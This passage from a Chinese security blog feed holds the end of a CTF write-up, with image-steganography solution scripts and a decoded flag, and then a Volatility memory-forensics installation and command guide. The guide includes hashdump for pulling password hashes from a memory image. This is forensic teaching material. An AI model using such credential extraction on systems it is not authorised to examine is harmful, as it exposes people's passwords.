class="hljs-number">58</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">60</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">61</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">66</span><br>[*] Closed connection <span class="hljs-keyword">to</span> node4.buuoj.cn port <span class="hljs-number">25868</span><br>[+] Flag: flag&#123;b<span class="hljs-string">&#x27;c069b2d7-0fca-4819-a656-44e4451deaaf&#x27;</span>&#125;<br>[+] Time: <span class="hljs-number">50.63801121711731</span>s<br></code></pre></td></tr></table></figure><h2 id="Just-a-GIF"><a href="#Just-a-GIF" class="headerlink" title="Just a GIF"></a>Just a GIF</h2><p>提取帧数，一共451帧,对比发现11帧一组，一共41组.</p><p>把除第1组之后的每一组的第n帧跟第一组的第n帧比较，相同为纯白，不同为纯黑</p><p>把同内容的图片作为一个系列，然后系列中的图片与该系列第一张图片比较，新建一张</p><p>83x83的空白图，把所有存在像素值不同的位置标记为黑色，即可得到隐藏的11张图片</p><p>中的1张，剩下的以此类推即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding: utf-8 </span><br><span class="hljs-keyword">import</span> os <br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image <br><br><span class="hljs-comment">#分离gif </span><br><br>img=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Just_a_GIF.gif&#x27;</span>) <br>os.mkdir(<span class="hljs-string">&#x27;./png&#x27;</span>) <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(img.n_frames): <br>img.seek(i) <br>new = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>, img.size) <br>new.paste(img) <br>new.save(<span class="hljs-string">&#x27;png\\&#x27;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;.png&#x27;</span>) <br><br>    <br>    <br><span class="hljs-comment">#处理分离出来的png </span><br>os.mkdir(<span class="hljs-string">&#x27;./flag&#x27;</span>) <br><br>path1=<span class="hljs-string">r&quot;./flag/&quot;</span> <br>path2=<span class="hljs-string">r&quot;./png/&quot;</span> <br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>): <br>img=Image.<span class="hljs-built_in">open</span>(path2+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;.png&#x27;</span>) <br><span class="hljs-comment">#隐藏的图片尺寸为83*83 </span><br>img1=Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>,(<span class="hljs-number">83</span>,<span class="hljs-number">83</span>),(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>)) <br><span class="hljs-comment">#图片每帧跟同内容的第一帧进行像素比较，不同处用黑色，叠加起来 </span><br><span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>): <br>im=Image.<span class="hljs-built_in">open</span>(path2+<span class="hljs-built_in">str</span>((h+<span class="hljs-number">1</span>)*<span class="hljs-number">11</span>+i)+<span class="hljs-string">&#x27;.png&#x27;</span>) <br>width,height=img.size <br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,width):<br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,height): <br>tmp = img.getpixel((j,k)) <br>tmp1 = im.getpixel((j,k)) <br><span class="hljs-keyword">if</span> tmp != tmp1: <br>img1.putpixel((j,k),(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)) <br>img1.save(path1+<span class="hljs-built_in">str</span>(i+<span class="hljs-number">1</span>)+<span class="hljs-string">&#x27;.png&#x27;</span>) <br></code></pre></td></tr></table></figure><p>得到11张图片</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122323-509098.png" alt="image-20210815122322173"></p><p>按照10和11的顺序拼接得到</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122333-324537.png" alt="image-20210815122331942"></p><p>DataMatrix：<a href="https://demo.dynamsoft.com/barcode-reader/">https://demo.dynamsoft.com/barcode-reader/</a></p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122350-188687.png" alt="image-20210815122347387"></p><h2 id="Nuclear-wastewater"><a href="#Nuclear-wastewater" class="headerlink" title="Nuclear wastewater"></a>Nuclear wastewater</h2><p>小明去日本旅游时，发现了一张被核废水污染过的二维码，你能从中发现什么信息吗。</p><p>思路：直接处理图片的三个通道，观察rgb数值，并进行chr，可以发现有大量的重复的内容，猜测可以利用词频进行排序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>pic = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Nuclear wastewater.png&#x27;</span>)<br>a, b = pic.size<br>list1 = []  <span class="hljs-comment">#将三个像素值都存入列表元素</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,b,<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, a, <span class="hljs-number">10</span>):<br>        pixel = pic.getpixel((x, y))<br>        <span class="hljs-keyword">if</span> pixel == (<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>):<br>             <span class="hljs-keyword">continue</span><br>        r, g, b1 = pixel<br>        list1.extend([r, g, b1])<br><span class="hljs-comment">#print(list1)</span><br><br>dic1 = &#123;&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> list1:<br>    dic1[i] = dic1.get(i, <span class="hljs-number">0</span>) + <span class="hljs-number">1</span><br>result = <span class="hljs-built_in">sorted</span>(dic1.items(), key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-number">1</span>], reverse=<span class="hljs-literal">True</span>)<br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> result:<br>    print(<span class="hljs-built_in">chr</span>(s[<span class="hljs-number">0</span>]), end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">theKEYis:</span><span class="hljs-meta">#R@/&amp;p~!(▒?£ñ$ªVJÞÍFjÀÈ÷¢©¼§UÌ¦õ±·ðäôÉCS</span><br><span class="hljs-number">2</span>ÚHÏ&gt;Á<br></code></pre></td></tr></table></figure><p>得到口令#R@/&amp;p~!，解压得到flag.txt</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122426-607150.png" alt="image-20210815122425969"></p><p>有猫腻，vim查看一下</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122440-299502.png" alt="image-20210815122438743"></p><p>零宽字节隐写，包含200C、200D、200E，</p><p>解题工具：<a href="https://330k.github.io/misc_tools/unicode_steganography.html">https://330k.github.io/misc_tools/unicode_steganography.html</a></p><p>先在下面设置一下，勾选零宽字符：</p><p>U+200C ZERO WIDTH NON-JOINER<br>U+200D ZERO WIDTH JOINER<br>U+200E LEFT-TO-RIGHT MARK</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122452-433384.png" alt="image-20210815122451134"></p><p>根据提示Citrix CTX1解密</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">OIENKMAJOLEOKMAJOHECLHBCPGFDLNBIPAFFLPBKPIFNLEBBPPFKLFBAPEFBLJBMPHFCLEBBPMFJLEBBPLFOLHBCPCFHLNBIPDFGLHBCPPFKLIBNPHFCLDBGPGFDLBBEPPFKLHBCPPFKLMBJPDFGLCBHPHFCLBBEPIFNLNBIPOFLLMBJPDFGLBBEPEFBLBBEPPFKLGBDPOFLLABFPMFJLABFPCFHLNBIPDFGLMBJPEFBLIBNPHFCLLBOPOFLLBBEPIFNLDBGPAFFKAAFOPEKKDAGOGEDKJAMOAEFKLAOOIENLIBNPEFBLLBOPJFMLFBAPLFOLFBAPNFILEBBPLFOLFBAPAFFLJBMPHFCLJBMPBFELIBNPHFCLIBNPNFILBBEPPFKKPAKOHECKMAJOAEFKKAPOIENKFAAOLEOKHACOPEKKAAFOPEKKAAFOFEAKJAMOHECKLAOODEGKMAJOAEFKPAKONEIKBAEOIENKAAFODEGKAAFOPEKKLAOOOELKJAMOAEFKGADOFEAKEABOLEOKOALOLEOKJAMOAEFKIANOLEOKIANOEEBKFAAOHECKBAEOIENKJAMOKEPKMAJPMFJLCBHPEFBLNBI</span><br></code></pre></td></tr></table></figure><p>解码两次得到flag</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122503-379175.png" alt="image-20210815122502554"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CRYPTO&quot;&gt;&lt;a href=&quot;#CRYPTO&quot; class=&quot;headerlink&quot; title=&quot;CRYPTO&quot;&gt;&lt;/a&gt;CRYPTO&lt;/h1&gt;&lt;h2 id=&quot;Yusa的密码学签到——BlockTrick&quot;&gt;&lt;a href=&quot;#Yusa的密码学签到——Blo</summary>
      
    
    
    
    <category term="CTF" scheme="http://atkx.top/categories/CTF/"/>
    
    <category term="比赛复现" scheme="http://atkx.top/categories/CTF/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Write up" scheme="http://atkx.top/tags/Write-up/"/>
    
  </entry>
  
  <entry>
    <title>Volatility内存取证</title>
    <link href="http://atkx.top/2021/06/03/Volatility%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/"/>
    <id>http://atkx.top/2021/06/03/Volatility%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/</id>
    <published>2021-06-03T13:02:15.000Z</published>
    <updated>2021-08-15T03:59:06.673Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装Volatility"><a href="#安装Volatility" class="headerlink" title="安装Volatility"></a>安装Volatility</h2><p>新版kali不自带Volatility，需要自己安装源码编译</p><p>1.下载源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">https:<span class="hljs-comment">//pan.baidu.com/s/1r-9VC3aG-sP6wWziYNvXxA  </span><br><br>提取码：<span class="hljs-number">4</span>d4w<br></code></pre></td></tr></table></figure><p>2.安装依赖</p><ul><li>crypto库安装</li></ul><p>安装pycryptodome</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">pip2 install pycryptodome -i https:<span class="hljs-comment">//pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="hljs-comment">#如果不指定国内源，可能会出现超时错误HTTPSConnectionPool</span><br></code></pre></td></tr></table></figure><ul><li>distorm3库安装</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">项目地址<br>https:<span class="hljs-comment">//github.com/vext01/distorm3</span><br></code></pre></td></tr></table></figure><p>解压到kali里面之后用命令 python setup.py install 编译</p><p>输入pip2 list查看是否安装成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">Package      Version<br>------------ -------<br>cffi         1.14.0<br>distorm3     2<br>pip          20.3.4<br>pycryptodome 3.10.1<br>setuptools   18.5<br>volatility   2.6<br>wheel        0.29.0<br></code></pre></td></tr></table></figure><p>3.安装Volatility<br>将前面下载的项目，解压之后在Volatility中打开终端进行编译</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">python setup.py install <br></code></pre></td></tr></table></figure><p>最后输入vol.py -h测试一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root💀kali)-[/home/kali/volatility2.6]<br>└─<span class="hljs-comment"># vol.py -h                                                            </span><br>Volatility Foundation Volatility Framework 2.6<br>Usage: Volatility - A memory forensics analysis platform.<br><br>Options:<br>  -h, --<span class="hljs-built_in">help</span>            list all available options and their default values.<br>                        Default values may be <span class="hljs-built_in">set</span> <span class="hljs-keyword">in</span> the configuration file<br>                        (/etc/volatilityrc)<br>  --conf-file=/root/.volatilityrc<br>                        User based configuration file<br>  -d, --debug           Debug volatility<br>  --plugins=PLUGINS     Additional plugin directories to use (colon separated)<br>  --info                Print information about all registered objects<br>  --cache-directory=/root/.cache/volatility<br>                        Directory <span class="hljs-built_in">where</span> cache files are stored<br>  --cache               Use caching<br>  --tz=TZ               Sets the (Olson) timezone <span class="hljs-keyword">for</span> displaying timestamps<br>                        using pytz (<span class="hljs-keyword">if</span> installed) or tzset<br>  -f FILENAME, --filename=FILENAME<br>                        Filename to use when opening an image<br>  --profile=WinXPSP2x86<br>                        Name of the profile to load (use --info to see a list<br>                        of supported profiles)<br>  -l LOCATION, --location=LOCATION<br>                        A URN location from <span class="hljs-built_in">which</span> to load an address space<br>  -w, --write           Enable write support<br>  --dtb=DTB             DTB Address<br>  --<span class="hljs-built_in">shift</span>=SHIFT         Mac KASLR <span class="hljs-built_in">shift</span> address<br>  --output=text         Output <span class="hljs-keyword">in</span> this format (support is module specific, see<br>                        the Module Output Options below)<br>  --output-file=OUTPUT_FILE<br>                        Write output <span class="hljs-keyword">in</span> this file<br>  -v, --verbose         Verbose information<br>  -g KDBG, --kdbg=KDBG  Specify a KDBG virtual address (Note: <span class="hljs-keyword">for</span> 64-bit<br>                        Windows 8 and above this is the address of<br>                        KdCopyDataBlock)<br>  --force               Force utilization of suspect profile<br>  --cookie=COOKIE       Specify the address of nt!ObHeaderCookie (valid <span class="hljs-keyword">for</span><br>                        Windows 10 only)<br>  -k KPCR, --kpcr=KPCR  Specify a specific KPCR address<br><br>        Supported Plugin Commands:<br><br>                amcache         Print AmCache information<br>                apihooks        Detect API hooks <span class="hljs-keyword">in</span> process and kernel memory<br>                atoms           Print session and window station atom tables<br>                atomscan        Pool scanner <span class="hljs-keyword">for</span> atom tables<br>                auditpol        Prints out the Audit Policies from HKLM\SECURITY\Policy\PolAdtEv<br>                bigpools        Dump the big page pools using BigPagePoolScanner<br>                bioskbd         Reads the keyboard buffer from Real Mode memory<br>                cachedump       Dumps cached domain hashes from memory<br>                callbacks       Print system-wide notification routines<br>                clipboard       Extract the contents of the windows clipboard<br>                cmdline         Display process command-line arguments<br>                cmdscan         Extract <span class="hljs-built_in">command</span> <span class="hljs-built_in">history</span> by scanning <span class="hljs-keyword">for</span> _COMMAND_HISTORY<br>                connections     Print list of open connections [Windows XP and 2003 Only]<br>                connscan        Pool scanner <span class="hljs-keyword">for</span> tcp connections<br>                consoles        Extract <span class="hljs-built_in">command</span> <span class="hljs-built_in">history</span> by scanning <span class="hljs-keyword">for</span> _CONSOLE_INFORMATION<br>                crashinfo       Dump crash-dump information<br>                deskscan        Poolscaner <span class="hljs-keyword">for</span> tagDESKTOP (desktops)<br>                devicetree      Show device tree<br>                dlldump         Dump DLLs from a process address space<br>                dlllist         Print list of loaded dlls <span class="hljs-keyword">for</span> each process<br>                driverirp       Driver IRP hook detection<br>                drivermodule    Associate driver objects to kernel modules<br>                driverscan      Pool scanner <span class="hljs-keyword">for</span> driver objects<br>                dumpcerts       Dump RSA private and public SSL keys<br>                dumpfiles       Extract memory mapped and cached files<br>                dumpregistry    Dumps registry files out to disk <br>                editbox         Displays information about Edit controls. (Listbox experimental.)<br>                envars          Display process environment variables<br>                eventhooks      Print details on windows event hooks<br>                evtlogs         Extract Windows Event Logs (XP/2003 only)<br>                filescan        Pool scanner <span class="hljs-keyword">for</span> file objects<br>                gahti           Dump the USER handle <span class="hljs-built_in">type</span> information<br>                gditimers       Print installed GDI timers and callbacks<br>                gdt             Display Global Descriptor Table<br>                getservicesids  Get the names of services <span class="hljs-keyword">in</span> the Registry and <span class="hljs-built_in">return</span> Calculated SID<br>                getsids         Print the SIDs owning each process<br>                handles         Print list of open handles <span class="hljs-keyword">for</span> each process<br>                hashdump        Dumps passwords hashes (LM/NTLM) from memory<br>                hibinfo         Dump hibernation file information<br>                hivedump        Prints out a hive<br>                hivelist        Print list of registry hives.<br>                hivescan        Pool scanner <span class="hljs-keyword">for</span> registry hives<br>                hpakextract     Extract physical memory from an HPAK file<br>                hpakinfo        Info on an HPAK file<br>                idt             Display Interrupt Descriptor Table<br>                iehistory       Reconstruct Internet Explorer cache / <span class="hljs-built_in">history</span><br>                imagecopy       Copies a physical address space out as a raw DD image<br>                imageinfo       Identify information <span class="hljs-keyword">for</span> the image <br>                impscan         Scan <span class="hljs-keyword">for</span> calls to imported <span class="hljs-built_in">functions</span><br>                joblinks        Print process job link information<br>                kdbgscan        Search <span class="hljs-keyword">for</span> and dump potential KDBG values<br>                kpcrscan        Search <span class="hljs-keyword">for</span> and dump potential KPCR values<br>                ldrmodules      Detect unlinked DLLs<br>                lsadump         Dump (decrypted) LSA secrets from the registry<br>                machoinfo       Dump Mach-O file format information<br>                malfind         Find hidden and injected code<br>                mbrparser       Scans <span class="hljs-keyword">for</span> and parses potential Master Boot Records (MBRs) <br>                memdump         Dump the addressable memory <span class="hljs-keyword">for</span> a process<br>                memmap          Print the memory map<br>                messagehooks    List desktop and thread window message hooks<br>                mftparser       Scans <span class="hljs-keyword">for</span> and parses potential MFT entries <br>                moddump         Dump a kernel driver to an executable file sample<br>                modscan         Pool scanner <span class="hljs-keyword">for</span> kernel modules<br>                modules         Print list of loaded modules<br>                multiscan       Scan <span class="hljs-keyword">for</span> various objects at once<br>                mutantscan      Pool scanner <span class="hljs-keyword">for</span> mutex objects<br>                notepad         List currently displayed notepad text<br>                objtypescan     Scan <span class="hljs-keyword">for</span> Windows object <span class="hljs-built_in">type</span> objects<br>                patcher         Patches memory based on page scans<br>                poolpeek        Configurable pool scanner plugin<br>                printkey        Print a registry key, and its subkeys and values<br>                privs           Display process privileges<br>                procdump        Dump a process to an executable file sample<br>                pslist          Print all running processes by following the EPROCESS lists <br>                psscan          Pool scanner <span class="hljs-keyword">for</span> process objects<br>                pstree          Print process list as a tree<br>                psxview         Find hidden processes with various process listings<br>                qemuinfo        Dump Qemu information<br>                raw2dmp         Converts a physical memory sample to a windbg crash dump<br>                screenshot      Save a pseudo-screenshot based on GDI windows<br>                servicediff     List Windows services (ala Plugx)<br>                sessions        List details on _MM_SESSION_SPACE (user logon sessions)<br>                shellbags       Prints ShellBags info<br>                shimcache       Parses the Application Compatibility Shim Cache registry key<br>                shutdowntime    Print ShutdownTime of machine from registry<br>                sockets         Print list of open sockets<br>                sockscan        Pool scanner <span class="hljs-keyword">for</span> tcp socket objects<br>                ssdt            Display SSDT entries<br>                strings         Match physical offsets to virtual addresses (may take a <span class="hljs-keyword">while</span>, VERY verbose)<br>                svcscan         Scan <span class="hljs-keyword">for</span> Windows services<br>                symlinkscan     Pool scanner <span class="hljs-keyword">for</span> symlink objects<br>                thrdscan        Pool scanner <span class="hljs-keyword">for</span> thread objects<br>                threads         Investigate _ETHREAD and _KTHREADs<br>                timeliner       Creates a timeline from various artifacts <span class="hljs-keyword">in</span> memory <br>                timers          Print kernel timers and associated module DPCs<br>                truecryptmaster Recover TrueCrypt 7.1a Master Keys<br>                truecryptpassphrase     TrueCrypt Cached Passphrase Finder<br>                truecryptsummary        TrueCrypt Summary<br>                unloadedmodules Print list of unloaded modules<br>                userassist      Print userassist registry keys and information<br>                userhandles     Dump the USER handle tables<br>                vaddump         Dumps out the vad sections to a file<br>                vadinfo         Dump the VAD info<br>                vadtree         Walk the VAD tree and display <span class="hljs-keyword">in</span> tree format<br>                vadwalk         Walk the VAD tree<br>                vboxinfo        Dump virtualbox information<br>                verinfo         Prints out the version information from PE images<br>                vmwareinfo      Dump VMware VMSS/VMSN information<br>                volshell        Shell <span class="hljs-keyword">in</span> the memory image<br>                windows         Print Desktop Windows (verbose details)<br>                wintree         Print Z-Order Desktop Windows Tree<br>                wndscan         Pool scanner <span class="hljs-keyword">for</span> window stations<br>                yarascan        Scan process or kernel memory with Yara signatures<br><br></code></pre></td></tr></table></figure><h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><h3 id="0x00-查看镜像系统"><a href="#0x00-查看镜像系统" class="headerlink" title="0x00 - 查看镜像系统"></a>0x00 - 查看镜像系统</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; imageinfo  <span class="hljs-comment">#常见的内存镜像文件有raw、vmem、dmp、img等</span><br></code></pre></td></tr></table></figure><h3 id="0x01-查看用户名密码信息"><a href="#0x01-查看用户名密码信息" class="headerlink" title="0x01 - 查看用户名密码信息"></a>0x01 - 查看用户名密码信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] hashdump<br></code></pre></td></tr></table></figure><h3 id="0x02-查看进程信息"><a href="#0x02-查看进程信息" class="headerlink" title="0x02 - 查看进程信息"></a>0x02 - 查看进程信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] pslist<br><br>vol.py -f &lt;镜像文件&gt; --profile=[profile文件] pstree <span class="hljs-comment">#可以识别子进程和父进程，且可以显示出被隐藏的病毒</span><br></code></pre></td></tr></table></figure><h3 id="0x03-扫描所有的文件列表"><a href="#0x03-扫描所有的文件列表" class="headerlink" title="0x03 - 扫描所有的文件列表"></a>0x03 - 扫描所有的文件列表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] filescan<br><br>vol.py -f &lt;镜像文件&gt; --profile=[profile文件] filescan | grep flag  <br></code></pre></td></tr></table></figure><h3 id="0x04-查看cmd上的操作"><a href="#0x04-查看cmd上的操作" class="headerlink" title="0x04 - 查看cmd上的操作"></a>0x04 - 查看cmd上的操作</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] cmdscan<br><br>vol.py -f &lt;镜像文件&gt; --profile=[profile文件] cmdline <span class="hljs-comment">#列出命令行下运行的程序</span><br></code></pre></td></tr></table></figure><h3 id="0x05-查看具体恶意进程"><a href="#0x05-查看具体恶意进程" class="headerlink" title="0x05 - 查看具体恶意进程"></a>0x05 - 查看具体恶意进程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] pstree  | egrep <span class="hljs-string">&#x27;(a.exe|b.exe)&#x27;</span>   <span class="hljs-comment">#以树的形式来列出正在进行的进程</span><br></code></pre></td></tr></table></figure><h3 id="0x06-检查恶意链接"><a href="#0x06-检查恶意链接" class="headerlink" title="0x06 -  检查恶意链接"></a>0x06 -  检查恶意链接</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">检查链接插件：vol.py -f &lt;镜像文件&gt; --profile=[profile文件] connections<br>检查端口插件：vol.py -f &lt;镜像文件&gt; --profile=[profile文件] sockets<br></code></pre></td></tr></table></figure><h3 id="0x07-检测DLL"><a href="#0x07-检测DLL" class="headerlink" title="0x07 - 检测DLL"></a>0x07 - 检测DLL</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] dlllist -p[pid]<br>vol.py -f &lt;镜像文件&gt; --profile=[profile文件] ldrmodules  -p[pid] -v <span 